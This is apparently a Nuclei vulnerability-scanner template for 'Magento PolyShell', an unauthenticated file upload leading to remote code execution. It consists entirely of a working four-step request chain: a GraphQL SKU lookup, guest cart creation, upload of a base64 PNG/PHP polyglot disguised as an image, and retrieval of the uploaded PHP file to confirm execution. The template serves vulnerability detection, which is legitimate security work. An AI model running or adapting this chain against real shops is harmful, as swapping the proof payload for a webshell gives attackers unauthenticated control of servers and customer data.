flow: http(1) && http(2) && http(3) && http(4)
http:
- extractors:
  - internal: true
    json:
    - .data.products.items[0].sku
    name: product_sku
    type: json
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "products","data")
    internal: true
    type: dsl
  raw:
  - 'POST /graphql HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"query": "{ products(search: \"\", pageSize: 1) { items { sku } } }"}

    '
- extractors:
  - group: 1
    internal: true
    name: cart_id
    part: body
    regex:
    - '"([a-zA-Z0-9]+)"'
    type: regex
  matchers:
  - dsl:
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'POST /rest/default/V1/guest-carts HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    '
- extractors:
  - group: 1
    internal: true
    name: upload_subdir1
    part: body
    regex:
    - custom_options[\\/\\\\]+quote[\\/\\\\]+([a-zA-Z0-9]+)[\\/\\\\]
    type: regex
  - group: 2
    internal: true
    name: upload_subdir2
    part: body
    regex:
    - custom_options[\\/\\\\]+quote[\\/\\\\]+([a-zA-Z0-9]+)[\\/\\\\]+([a-zA-Z0-9]+)[\\/\\\\]
    type: regex
  - group: 3
    internal: true
    name: upload_filename
    part: body
    regex:
    - custom_options[\\/\\\\]+quote[\\/\\\\]+([a-zA-Z0-9]+)[\\/\\\\]+([a-zA-Z0-9]+)[\\/\\\\]+([a-zA-Z0-9]+\.php)
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "option_value","option_id")
    internal: true
    type: dsl
  raw:
  - 'POST /rest/default/V1/guest-carts/{{cart_id}}/items HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"cart_item":{"product_option":{"extension_attributes":{"custom_options":[{"extension_attributes":{"file_info":{"base64_encoded_data":"{{polyglot_b64}}","name":"{{php_filename}}","type":"image/png"}},"option_id":"12345","option_value":"file"}]}},"qty":1,"sku":"{{product_sku}}"}}

    '
- extractors:
  - group: 1
    part: body
    regex:
    - RESULT:([0-9]+)
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "RESULT:2674")
    type: dsl
  raw:
  - 'GET /pub/media/custom_options/quote/{{upload_subdir1}}/{{upload_subdir2}}/{{upload_filename}}
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /media/custom_options/quote/{{upload_subdir1}}/{{upload_subdir2}}/{{upload_filename}}
    HTTP/1.1

    Host: {{Hostname}}

    '
  stop-at-first-match: true
id: magento-polyshell-rce
info:
  author: slcyber,DhiyaneshDk
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-434,CWE-650
  description: 'Magento lacks file type validation on custom product options file
    upload feature accessible via unauthenticated REST/GraphQL APIs. Attackers can
    upload arbitrary PHP files through guest cart endpoints without authentication.
    Files are stored in pub/media/custom_options/quote/ directory with predictable
    paths. If web server allows PHP execution in media directories, this leads to
    remote code execution.

    '
  impact: 'Unauthenticated attackers can upload PHP webshells disguised as PNG files
    and achieve remote code execution on the server.

    '
  metadata:
    max-request: 5
    runzero-review: 'REJECT/2026-04-08/auto: forbidden tag: intrusive'
    shodan-query: html:"Magento_PageCache"
    verified: true
  name: "Magento PolyShell \u2013 Unauthenticated File Upload to RCE"
  reference:
  - https://github.com/markshust/magento-polyshell-patch/
  - https://slcyber.io/research-center/magento-polyshell-unauthenticated-file-upload-to-rce-in-magento-apsb25-94/#about-assetnote
  - https://helpx.adobe.com/security/products/magento/apsb25-94.html
  severity: critical
  tags: file-upload,intrusive,magento,rce
variables:
  php_filename: '{{rand_base(10)}}.php'
  polyglot_b64: iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAL3RFWHRDb21tZW50ACc8P3BocCBlY2hvICJSRVNVTFQ6IiAuICgyICogMTMzNyk7ID8+J0bMDMoAAAAPSURBVHgBAQQA+/8Ad/rpBEYCW5i/poUAAAAASUVORK5CYII=
